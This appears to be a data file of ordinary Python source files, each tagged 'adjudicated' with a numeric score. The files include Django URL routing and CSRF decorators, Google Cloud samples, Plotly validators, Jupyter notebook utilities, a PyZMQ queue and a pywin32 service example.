path('oauth/', include('social_django.urls', namespace='social')),<<NEWL>>]<<NEWL>><<NEWL>>if settings.DEBUG:<<NEWL>>    urlpatterns += static(settings.MEDIA_URL,document_root=settings.MEDIA_ROOT)"
102	adjudicated	3	"# This is an example of a service hosted by python.exe rather than<<NEWL>># pythonservice.exe.<<NEWL>><<NEWL>># Note that it is very rare that using python.exe is a better option<<NEWL>># than the default pythonservice.exe - the latter has better error handling<<NEWL>># so that if Python itself can't be initialized or there are very early<<NEWL>># import errors, you will get error details written to the event log.  When<<NEWL>># using python.exe instead, you are forced to wait for the interpreter startup<<NEWL>># and imports to succeed before you are able to effectively setup your own<<NEWL>># error handling.<<NEWL>><<NEWL>># So in short, please make sure you *really* want to do this, otherwise just<<NEWL>># stick with the default.<<NEWL>><<NEWL>>import sys<<NEWL>>import os<<NEWL>>import win32serviceutil<<NEWL>>import servicemanager<<NEWL>><<NEWL>>from pipeTestService import TestPipeService<<NEWL>><<NEWL>><<NEWL>>class NativeTestPipeService(TestPipeService):<<NEWL>>    _svc_name_ = ""PyNativePipeTestService""<<NEWL>>    _svc_display_name_ = ""Python Native Pipe Test Service""<<NEWL>>    _svc_description_ = ""Tests Python.exe hosted services""<<NEWL>>    # tell win32serviceutil we have a custom executable and custom args<<NEWL>>    # so registration does the right thing.<<NEWL>>    _exe_name_ = sys.executable<<NEWL>>    _exe_args_ = '""' + os.path.abspath(sys.argv[0]) + '""'<<NEWL>><<NEWL>><<NEWL>>def main():<<NEWL>>    if len(sys.argv) == 1:<<NEWL>>        # service must be starting...<<NEWL>>        # for the sake of debugging etc, we use win32traceutil to see<<NEWL>>        # any unhandled exceptions and print statements.<<NEWL>>        import win32traceutil<<NEWL>><<NEWL>>        print(""service is starting..."")<<NEWL>>        print(""(execute this script with '--help' if that isn't what you want)"")<<NEWL>><<NEWL>>        servicemanager.Initialize()<<NEWL>>        servicemanager.PrepareToHostSingle(NativeTestPipeService)<<NEWL>>        # Now ask the service manager to fire things up for us...<<NEWL>>        servicemanager.StartServiceCtrlDispatcher()<<NEWL>>        print(""service done!"")<<NEWL>>    else:<<NEWL>>        win32serviceutil.HandleCommandLine(NativeTestPipeService)<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    try:<<NEWL>>        main()<<NEWL>>    except (SystemExit, KeyboardInterrupt):<<NEWL>>        raise<<NEWL>>    except:<<NEWL>>        print(""Something went bad!"")<<NEWL>>        import traceback<<NEWL>><<NEWL>>        traceback.print_exc()"
42	adjudicated	3	"# Copyright 2020 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     https://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>># [START vision_async_batch_annotate_images]<<NEWL>><<NEWL>>from google.cloud import vision_v1<<NEWL>><<NEWL>><<NEWL>>def sample_async_batch_annotate_images(<<NEWL>>    input_image_uri=""gs://cloud-samples-data/vision/label/wakeupcat.jpg"",<<NEWL>>    output_uri=""gs://your-bucket/prefix/"",<<NEWL>>):<<NEWL>>    """"""Perform async batch image annotation.""""""<<NEWL>>    client = vision_v1.ImageAnnotatorClient()<<NEWL>><<NEWL>>    source = {""image_uri"": input_image_uri}<<NEWL>>    image = {""source"": source}<<NEWL>>    features = [<<NEWL>>        {""type_"": vision_v1.Feature.Type.LABEL_DETECTION},<<NEWL>>        {""type_"": vision_v1.Feature.Type.IMAGE_PROPERTIES},<<NEWL>>    ]<<NEWL>><<NEWL>>    # Each requests element corresponds to a single image.  To annotate more<<NEWL>>    # images, create a request element for each image and add it to<<NEWL>>    # the array of requests<<NEWL>>    requests = [{""image"": image, ""features"": features}]<<NEWL>>    gcs_destination = {""uri"": output_uri}<<NEWL>><<NEWL>>    # The max number of responses to output in each JSON file<<NEWL>>    batch_size = 2<<NEWL>>    output_config = {""gcs_destination"": gcs_destination,<<NEWL>>                     ""batch_size"": batch_size}<<NEWL>><<NEWL>>    operation = client.async_batch_annotate_images(requests=requests, output_config=output_config)<<NEWL>><<NEWL>>    print(""Waiting for operation to complete..."")<<NEWL>>    response = operation.result(90)<<NEWL>><<NEWL>>    # The output is written to GCS with the provided output_uri as prefix<<NEWL>>    gcs_output_uri = response.output_config.gcs_destination.uri<<NEWL>>    print(""Output written to GCS with prefix: {}"".format(gcs_output_uri))<<NEWL>><<NEWL>><<NEWL>># [END vision_async_batch_annotate_images]"
153	adjudicated	0	"import datetime<<NEWL>>import time<<NEWL>><<NEWL>>from telegramfeed import interfaces, repositories, services<<NEWL>><<NEWL>><<NEWL>>class FeederService:<<NEWL>>    def __init__(<<NEWL>>        self,<<NEWL>>        chat_interface: interfaces.ChatInterface,<<NEWL>>        subscription_repo: repositories.SubscriptionRepo,<<NEWL>>        feed_downloader_service: services.FeedDownloaderService,<<NEWL>>    ):<<NEWL>>        self.chat_interface = chat_interface<<NEWL>>        self.subscription_repo = subscription_repo<<NEWL>>        self.feed_downloader_service = feed_downloader_service<<NEWL>><<NEWL>>    def start(self):<<NEWL>>        print(""Processing feeds"")<<NEWL>>        self.process_feeds()<<NEWL>><<NEWL>>    def process_feeds(self):<<NEWL>>        subscriptions = self.subscription_repo.fetch_all()<<NEWL>>        for subscription in subscriptions:<<NEWL>>            print(<<NEWL>>                f""Processing subscription {subscription.feed_url} for user {subscription.user_id}""<<NEWL>>            )<<NEWL>>            self._manage_subscription(subscription)<<NEWL>><<NEWL>>    def _manage_subscription(self, subscription):<<NEWL>>        feed_content = self.feed_downloader_service.download(subscription.feed_url)<<NEWL>><<NEWL>>        if ""entries"" not in feed_content.keys():<<NEWL>>            return<<NEWL>><<NEWL>>        for entry in feed_content[""entries""]:<<NEWL>>            self._manage_entry(subscription, entry)<<NEWL>><<NEWL>>        self._subscription_update_check(subscription)<<NEWL>><<NEWL>>    def _subscription_update_check(self, subscription):<<NEWL>>        subscription.last_check = datetime.datetime.now()<<NEWL>>        self.subscription_repo.update(subscription)<<NEWL>><<NEWL>>    def _manage_entry(self, subscription, entry):<<NEWL>>        updated_parsed = datetime.datetime.fromtimestamp(<<NEWL>>            time.mktime(entry[""updated_parsed""])<<NEWL>>        )<<NEWL>>        if subscription.last_check < updated_parsed:<<NEWL>>            self.send_entry(subscription, entry)<<NEWL>><<NEWL>>    def send_entry(self, subscription, entry):<<NEWL>>        try:<<NEWL>>            self.chat_interface.send_message(subscription.user_id, entry[""link""])<<NEWL>>        except Exception as e:<<NEWL>>            print(f""Error sending message: {e}"")"
382	adjudicated	2	"def _fix_contents(filename, contents):<<NEWL>>    import re<<NEWL>><<NEWL>>    contents = re.sub(<<NEWL>>        r""from bytecode"", r'from _pydevd_frame_eval.vendored.bytecode', contents, flags=re.MULTILINE<<NEWL>>    )<<NEWL>><<NEWL>>    contents = re.sub(<<NEWL>>        r""import bytecode"", r'from _pydevd_frame_eval.vendored import bytecode', contents, flags=re.MULTILINE<<NEWL>>    )<<NEWL>><<NEWL>>    # This test will import the wrong setup (we're not interested in it).<<NEWL>>    contents = re.sub(<<NEWL>>        r""def test_version\(self\):"", r'def skip_test_version(self):', contents, flags=re.MULTILINE<<NEWL>>    )<<NEWL>><<NEWL>>    if filename.startswith('test_'):<<NEWL>>        if 'pytestmark' not in contents:<<NEWL>>            pytest_mark = '''<<NEWL>>import pytest<<NEWL>>from tests_python.debugger_unittest import IS_PY36_OR_GREATER, IS_CPYTHON<<NEWL>>from tests_python.debug_constants import TEST_CYTHON<<NEWL>>pytestmark = pytest.mark.skipif(not IS_PY36_OR_GREATER or not IS_CPYTHON or not TEST_CYTHON, reason='Requires CPython >= 3.6')<<NEWL>>'''<<NEWL>>            contents = pytest_mark + contents<<NEWL>>    return contents<<NEWL>><<NEWL>><<NEWL>>def main():<<NEWL>>    import os<<NEWL>><<NEWL>>    # traverse root directory, and list directories as dirs and files as files<<NEWL>>    for root, dirs, files in os.walk(os.path.dirname(__file__)):<<NEWL>>        path = root.split(os.sep)<<NEWL>>        for filename in files:<<NEWL>>            if filename.endswith('.py') and filename != 'pydevd_fix_code.py':<<NEWL>>                with open(os.path.join(root, filename), 'r') as stream:<<NEWL>>                    contents = stream.read()<<NEWL>><<NEWL>>                new_contents = _fix_contents(filename, contents)<<NEWL>>                if contents != new_contents:<<NEWL>>                    print('fixed ', os.path.join(root, filename))<<NEWL>>                    with open(os.path.join(root, filename), 'w') as stream:<<NEWL>>                        stream.write(new_contents)<<NEWL>><<NEWL>>#             print(len(path) * '---', filename)<<NEWL>><<NEWL>><<NEWL>>if __name__ == '__main__':<<NEWL>>    main()"
13	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class FontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""font"", parent_name=""choropleth.hoverlabel"", **kwargs<<NEWL>>    ):<<NEWL>>        super(FontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Font""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
231	adjudicated	4	"""""""Latex filters.<<NEWL>><<NEWL>>Module of useful filters for processing Latex within Jinja latex templates.<<NEWL>>""""""<<NEWL>># -----------------------------------------------------------------------------<<NEWL>># Copyright (c) 2013, the IPython Development Team.<<NEWL>>#<<NEWL>># Distributed under the terms of the Modified BSD License.<<NEWL>>#<<NEWL>># The full license is in the file COPYING.txt, distributed with this software.<<NEWL>># -----------------------------------------------------------------------------<<NEWL>><<NEWL>># -----------------------------------------------------------------------------<<NEWL>># Imports<<NEWL>># -----------------------------------------------------------------------------<<NEWL>>import re<<NEWL>><<NEWL>># -----------------------------------------------------------------------------<<NEWL>># Globals and constants<<NEWL>># -----------------------------------------------------------------------------<<NEWL>><<NEWL>>LATEX_RE_SUBS = ((re.compile(r""\.\.\.+""), r""{\\ldots}""),)<<NEWL>><<NEWL>># Latex substitutions for escaping latex.<<NEWL>># see: http://stackoverflow.com/questions/16259923/how-can-i-escape-latex-special-characters-inside-django-templates<<NEWL>><<NEWL>>LATEX_SUBS = {<<NEWL>>    ""&"": r""\&"",<<NEWL>>    ""%"": r""\%"",<<NEWL>>    ""$"": r""\$"",<<NEWL>>    ""#"": r""\#"",<<NEWL>>    ""_"": r""\_"",<<NEWL>>    ""{"": r""\{"",<<NEWL>>    ""}"": r""\}"",<<NEWL>>    ""~"": r""\textasciitilde{}"",<<NEWL>>    ""^"": r""\^{}"",<<NEWL>>    ""\\"": r""\textbackslash{}"",<<NEWL>>}<<NEWL>><<NEWL>><<NEWL>># -----------------------------------------------------------------------------<<NEWL>># Functions<<NEWL>># -----------------------------------------------------------------------------<<NEWL>><<NEWL>>__all__ = [""escape_latex""]<<NEWL>><<NEWL>><<NEWL>>def escape_latex(text):<<NEWL>>    """"""<<NEWL>>    Escape characters that may conflict with latex.<<NEWL>><<NEWL>>    Parameters<<NEWL>>    ----------<<NEWL>>    text : str<<NEWL>>        Text containing characters that may conflict with Latex<<NEWL>>    """"""<<NEWL>>    text = """".join(LATEX_SUBS.get(c, c) for c in text)<<NEWL>>    for pattern, replacement in LATEX_RE_SUBS:<<NEWL>>        text = pattern.sub(replacement, text)<<NEWL>><<NEWL>>    return text"
371	adjudicated	3	"from functools import wraps<<NEWL>><<NEWL>>from django.middleware.csrf import CsrfViewMiddleware, get_token<<NEWL>>from django.utils.decorators import decorator_from_middleware<<NEWL>><<NEWL>>csrf_protect = decorator_from_middleware(CsrfViewMiddleware)<<NEWL>>csrf_protect.__name__ = ""csrf_protect""<<NEWL>>csrf_protect.__doc__ = """"""<<NEWL>>This decorator adds CSRF protection in exactly the same way as<<NEWL>>CsrfViewMiddleware, but it can be used on a per view basis.  Using both, or<<NEWL>>using the decorator multiple times, is harmless and efficient.<<NEWL>>""""""<<NEWL>><<NEWL>><<NEWL>>class _EnsureCsrfToken(CsrfViewMiddleware):<<NEWL>>    # Behave like CsrfViewMiddleware but don't reject requests or log warnings.<<NEWL>>    def _reject(self, request, reason):<<NEWL>>        return None<<NEWL>><<NEWL>><<NEWL>>requires_csrf_token = decorator_from_middleware(_EnsureCsrfToken)<<NEWL>>requires_csrf_token.__name__ = 'requires_csrf_token'<<NEWL>>requires_csrf_token.__doc__ = """"""<<NEWL>>Use this decorator on views that need a correct csrf_token available to<<NEWL>>RequestContext, but without the CSRF protection that csrf_protect<<NEWL>>enforces.<<NEWL>>""""""<<NEWL>><<NEWL>><<NEWL>>class _EnsureCsrfCookie(CsrfViewMiddleware):<<NEWL>>    def _reject(self, request, reason):<<NEWL>>        return None<<NEWL>><<NEWL>>    def process_view(self, request, callback, callback_args, callback_kwargs):<<NEWL>>        retval = super().process_view(request, callback, callback_args, callback_kwargs)<<NEWL>>        # Force process_response to send the cookie<<NEWL>>        get_token(request)<<NEWL>>        return retval<<NEWL>><<NEWL>><<NEWL>>ensure_csrf_cookie = decorator_from_middleware(_EnsureCsrfCookie)<<NEWL>>ensure_csrf_cookie.__name__ = 'ensure_csrf_cookie'<<NEWL>>ensure_csrf_cookie.__doc__ = """"""<<NEWL>>Use this decorator to ensure that a view sets a CSRF cookie, whether or not it<<NEWL>>uses the csrf_token template tag, or the CsrfViewMiddleware is used.<<NEWL>>""""""<<NEWL>><<NEWL>><<NEWL>>def csrf_exempt(view_func):<<NEWL>>    """"""Mark a view function as being exempt from the CSRF view protection.""""""<<NEWL>>    # view_func.csrf_exempt = True would also work, but decorators are nicer<<NEWL>>    # if they don't have side effects, so return a new function.<<NEWL>>    def wrapped_view(*args, **kwargs):<<NEWL>>        return view_func(*args, **kwargs)<<NEWL>>    wrapped_view.csrf_exempt = True<<NEWL>>    return wraps(view_func)(wrapped_view)"
260	adjudicated	0	"# -*- coding: utf-8 -*-<<NEWL>># Generated by the protocol buffer compiler.  DO NOT EDIT!<<NEWL>># source: streamlit/proto/PageNotFound.proto<<NEWL>><<NEWL>>from google.protobuf import descriptor as _descriptor<<NEWL>>from google.protobuf import message as _message<<NEWL>>from google.protobuf import reflection as _reflection<<NEWL>>from google.protobuf import symbol_database as _symbol_database<<NEWL>># @@protoc_insertion_point(imports)<<NEWL>><<NEWL>>_sym_db = _symbol_database.Default()<<NEWL>><<NEWL>><<NEWL>><<NEWL>><<NEWL>>DESCRIPTOR = _descriptor.FileDescriptor(<<NEWL>>  name='streamlit/proto/PageNotFound.proto',<<NEWL>>  package='',<<NEWL>>  syntax='proto3',<<NEWL>>  serialized_options=None,<<NEWL>>  create_key=_descriptor._internal_create_key,<<NEWL>>  serialized_pb=b'\n\""streamlit/proto/PageNotFound.proto\""!\n\x0cPageNotFound\x12\x11\n\tpage_name\x18\x01 \x01(\tb\x06proto3'<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>><<NEWL>><<NEWL>>_PAGENOTFOUND = _descriptor.Descriptor(<<NEWL>>  name='PageNotFound',<<NEWL>>  full_name='PageNotFound',<<NEWL>>  filename=None,<<NEWL>>  file=DESCRIPTOR,<<NEWL>>  containing_type=None,<<NEWL>>  create_key=_descriptor._internal_create_key,<<NEWL>>  fields=[<<NEWL>>    _descriptor.FieldDescriptor(<<NEWL>>      name='page_name', full_name='PageNotFound.page_name', index=0,<<NEWL>>      number=1, type=9, cpp_type=9, label=1,<<NEWL>>      has_default_value=False, default_value=b"""".decode('utf-8'),<<NEWL>>      message_type=None, enum_type=None, containing_type=None,<<NEWL>>      is_extension=False, extension_scope=None,<<NEWL>>      serialized_options=None, file=DESCRIPTOR,  create_key=_descriptor._internal_create_key),<<NEWL>>  ],<<NEWL>>  extensions=[<<NEWL>>  ],<<NEWL>>  nested_types=[],<<NEWL>>  enum_types=[<<NEWL>>  ],<<NEWL>>  serialized_options=None,<<NEWL>>  is_extendable=False,<<NEWL>>  syntax='proto3',<<NEWL>>  extension_ranges=[],<<NEWL>>  oneofs=[<<NEWL>>  ],<<NEWL>>  serialized_start=38,<<NEWL>>  serialized_end=71,<<NEWL>>)<<NEWL>><<NEWL>>DESCRIPTOR.message_types_by_name['PageNotFound'] = _PAGENOTFOUND<<NEWL>>_sym_db.RegisterFileDescriptor(DESCRIPTOR)<<NEWL>><<NEWL>>PageNotFound = _reflection.GeneratedProtocolMessageType('PageNotFound', (_message.Message,), {<<NEWL>>  'DESCRIPTOR' : _PAGENOTFOUND,<<NEWL>>  '__module__' : 'streamlit.proto.PageNotFound_pb2'<<NEWL>>  # @@protoc_insertion_point(class_scope:PageNotFound)<<NEWL>>  })<<NEWL>>_sym_db.RegisterMessage(PageNotFound)<<NEWL>><<NEWL>><<NEWL>># @@protoc_insertion_point(module_scope)"
240	adjudicated	4	"""""""MonitoredQueue classes and functions.""""""<<NEWL>><<NEWL>># Copyright (C) PyZMQ Developers<<NEWL>># Distributed under the terms of the Modified BSD License.<<NEWL>><<NEWL>><<NEWL>>from zmq import PUB<<NEWL>>from zmq.devices.monitoredqueue import monitored_queue<<NEWL>>from zmq.devices.proxydevice import ProcessProxy, Proxy, ProxyBase, ThreadProxy<<NEWL>><<NEWL>><<NEWL>>class MonitoredQueueBase(ProxyBase):<<NEWL>>    """"""Base class for overriding methods.""""""<<NEWL>><<NEWL>>    _in_prefix = b''<<NEWL>>    _out_prefix = b''<<NEWL>><<NEWL>>    def __init__(<<NEWL>>        self, in_type, out_type, mon_type=PUB, in_prefix=b'in', out_prefix=b'out'<<NEWL>>    ):<<NEWL>><<NEWL>>        ProxyBase.__init__(self, in_type=in_type, out_type=out_type, mon_type=mon_type)<<NEWL>><<NEWL>>        self._in_prefix = in_prefix<<NEWL>>        self._out_prefix = out_prefix<<NEWL>><<NEWL>>    def run_device(self):<<NEWL>>        ins, outs, mons = self._setup_sockets()<<NEWL>>        monitored_queue(ins, outs, mons, self._in_prefix, self._out_prefix)<<NEWL>><<NEWL>><<NEWL>>class MonitoredQueue(MonitoredQueueBase, Proxy):<<NEWL>>    """"""Class for running monitored_queue in the background.<<NEWL>><<NEWL>>    See zmq.devices.Device for most of the spec. MonitoredQueue differs from Proxy,<<NEWL>>    only in that it adds a ``prefix`` to messages sent on the monitor socket,<<NEWL>>    with a different prefix for each direction.<<NEWL>><<NEWL>>    MQ also supports ROUTER on both sides, which zmq.proxy does not.<<NEWL>><<NEWL>>    If a message arrives on `in_sock`, it will be prefixed with `in_prefix` on the monitor socket.<<NEWL>>    If it arrives on out_sock, it will be prefixed with `out_prefix`.<<NEWL>><<NEWL>>    A PUB socket is the most logical choice for the mon_socket, but it is not required.<<NEWL>>    """"""<<NEWL>><<NEWL>><<NEWL>>class ThreadMonitoredQueue(MonitoredQueueBase, ThreadProxy):<<NEWL>>    """"""Run zmq.monitored_queue in a background thread.<<NEWL>><<NEWL>>    See MonitoredQueue and Proxy for details.<<NEWL>>    """"""<<NEWL>><<NEWL>><<NEWL>>class ProcessMonitoredQueue(MonitoredQueueBase, ProcessProxy):<<NEWL>>    """"""Run zmq.monitored_queue in a separate process.<<NEWL>><<NEWL>>    See MonitoredQueue and Proxy for details.<<NEWL>>    """"""<<NEWL>><<NEWL>><<NEWL>>__all__ = ['MonitoredQueue', 'ThreadMonitoredQueue', 'ProcessMonitoredQueue']"
300	adjudicated	1	"# Copyright 2020 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#    http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>><<NEWL>># [START automl_batch_predict_beta]<<NEWL>>from google.cloud import automl_v1beta1 as automl<<NEWL>><<NEWL>><<NEWL>>def batch_predict(<<NEWL>>    project_id=""YOUR_PROJECT_ID"",<<NEWL>>    model_id=""YOUR_MODEL_ID"",<<NEWL>>    input_uri=""gs://YOUR_BUCKET_ID/path/to/your/input/csv_or_jsonl"",<<NEWL>>    output_uri=""gs://YOUR_BUCKET_ID/path/to/save/results/"",<<NEWL>>):<<NEWL>>    """"""Batch predict""""""<<NEWL>>    prediction_client = automl.PredictionServiceClient()<<NEWL>><<NEWL>>    # Get the full path of the model.<<NEWL>>    model_full_id = automl.AutoMlClient.model_path(<<NEWL>>        project_id, ""us-central1"", model_id<<NEWL>>    )<<NEWL>><<NEWL>>    gcs_source = automl.GcsSource(input_uris=[input_uri])<<NEWL>><<NEWL>>    input_config = automl.BatchPredictInputConfig(gcs_source=gcs_source)<<NEWL>>    gcs_destination = automl.GcsDestination(output_uri_prefix=output_uri)<<NEWL>>    output_config = automl.BatchPredictOutputConfig(<<NEWL>>        gcs_destination=gcs_destination<<NEWL>>    )<<NEWL>>    params = {}<<NEWL>><<NEWL>>    request = automl.BatchPredictRequest(<<NEWL>>        name=model_full_id,<<NEWL>>        input_config=input_config,<<NEWL>>        output_config=output_config,<<NEWL>>        params=params<<NEWL>>    )<<NEWL>>    response = prediction_client.batch_predict(<<NEWL>>        request=request<<NEWL>>    )<<NEWL>><<NEWL>>    print(""Waiting for operation to complete..."")<<NEWL>>    print(<<NEWL>>        ""Batch Prediction results saved to Cloud Storage bucket. {}"".format(<<NEWL>>            response.result()<<NEWL>>        )<<NEWL>>    )<<NEWL>># [END automl_batch_predict_beta]"
91	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class FontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""font"", parent_name=""funnel.hoverlabel"", **kwargs):<<NEWL>>        super(FontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Font""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
211	adjudicated	2	"""""""Read and write notebooks in JSON format.""""""<<NEWL>><<NEWL>># Copyright (c) IPython Development Team.<<NEWL>># Distributed under the terms of the Modified BSD License.<<NEWL>><<NEWL>>import copy<<NEWL>>import json<<NEWL>><<NEWL>>from ..notebooknode import from_dict<<NEWL>>from .rwbase import (<<NEWL>>    NotebookReader,<<NEWL>>    NotebookWriter,<<NEWL>>    rejoin_lines,<<NEWL>>    split_lines,<<NEWL>>    strip_transient,<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>>class BytesEncoder(json.JSONEncoder):<<NEWL>>    """"""A JSON encoder that accepts b64 (and other *ascii*) bytestrings.""""""<<NEWL>><<NEWL>>    def default(self, obj):<<NEWL>>        if isinstance(obj, bytes):<<NEWL>>            return obj.decode(""ascii"")<<NEWL>>        return json.JSONEncoder.default(self, obj)<<NEWL>><<NEWL>><<NEWL>>class JSONReader(NotebookReader):<<NEWL>>    def reads(self, s, **kwargs):<<NEWL>>        """"""Read a JSON string into a Notebook object""""""<<NEWL>>        nb = json.loads(s, **kwargs)<<NEWL>>        nb = self.to_notebook(nb, **kwargs)<<NEWL>>        return nb<<NEWL>><<NEWL>>    def to_notebook(self, d, **kwargs):<<NEWL>>        """"""Convert a disk-format notebook dict to in-memory NotebookNode<<NEWL>><<NEWL>>        handles multi-line values as strings, scrubbing of transient values, etc.<<NEWL>>        """"""<<NEWL>>        nb = from_dict(d)<<NEWL>>        nb = rejoin_lines(nb)<<NEWL>>        nb = strip_transient(nb)<<NEWL>>        return nb<<NEWL>><<NEWL>><<NEWL>>class JSONWriter(NotebookWriter):<<NEWL>>    def writes(self, nb, **kwargs):<<NEWL>>        """"""Serialize a NotebookNode object as a JSON string""""""<<NEWL>>        kwargs[""cls""] = BytesEncoder<<NEWL>>        kwargs[""indent""] = 1<<NEWL>>        kwargs[""sort_keys""] = True<<NEWL>>        kwargs[""separators""] = ("","", "": "")<<NEWL>>        kwargs.setdefault(""ensure_ascii"", False)<<NEWL>>        # don't modify in-memory dict<<NEWL>>        nb = copy.deepcopy(nb)<<NEWL>>        if kwargs.pop(""split_lines"", True):<<NEWL>>            nb = split_lines(nb)<<NEWL>>        nb = strip_transient(nb)<<NEWL>>        return json.dumps(nb, **kwargs)<<NEWL>><<NEWL>><<NEWL>>_reader = JSONReader()<<NEWL>>_writer = JSONWriter()<<NEWL>><<NEWL>>reads = _reader.reads<<NEWL>>read = _reader.read<<NEWL>>to_notebook = _reader.to_notebook<<NEWL>>write = _writer.write<<NEWL>>writes = _writer.writes"
180	adjudicated	1	"""""""BuildMyResume URL Configuration<<NEWL>><<NEWL>>The `urlpatterns` list routes URLs to views. <<NEWL>>""""""<<NEWL>>from django.contrib import admin<<NEWL>>from django.contrib.auth import views as auth_views<<NEWL>>from django.urls import path, include<<NEWL>>from django.conf.urls.static import static<<NEWL>>from django.conf import settings<<NEWL>><<NEWL>>from . import views<<NEWL>>from users import views as users_views<<NEWL>><<NEWL>>urlpatterns = [<<NEWL>>    path('admin/', admin.site.urls),<<NEWL>>    path('', views.home_view, name='home'),<<NEWL>><<NEWL>>    path('home/', include(('home.urls', 'home'), namespace='home')),<<NEWL>>    path('accounts/', include('allauth.urls')),<<NEWL>><<NEWL>>    path('signup/', users_views.signup, name='signup'),<<NEWL>>    path('activate/<uidb64>/<token>/', users_views.activate, name='activate'),<<NEWL>><<NEWL>>    path('login/', auth_views.LoginView.as_view(template_name='users/login.html'), name='login'),<<NEWL>>    path('logout/', auth_views.LogoutView.as_view(next_page='/accounts/login'), name='logout'),<<NEWL>>    path('password-reset/', auth_views.PasswordResetView.as_view(template_name='users/password_reset.html'), name='password_reset'),<<NEWL>>    path('password-reset/done/', auth_views.PasswordChangeDoneView.as_view(template_name='users/password_reset_done.html'), name='password_reset_done'),<<NEWL>>    path('password-reset-confirm/<uidb64>/<token>/', auth_views.PasswordResetConfirmView.as_view(template_name='users/password_reset_confirm.html'), name='password_reset_confirm'),<<NEWL>>    path('password-reset-complete/', auth_views.PasswordResetCompleteView.as_view(template_name='users/password_reset_complete.html'), name='password_reset_complete'),<<NEWL>><<NEWL>>    path('__debug__/', include('debug_toolbar.urls')),<<NEWL>><<NEWL>>]<<NEWL>>if settings.DEBUG:<<NEWL>>    urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT) <<NEWL>>    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)"
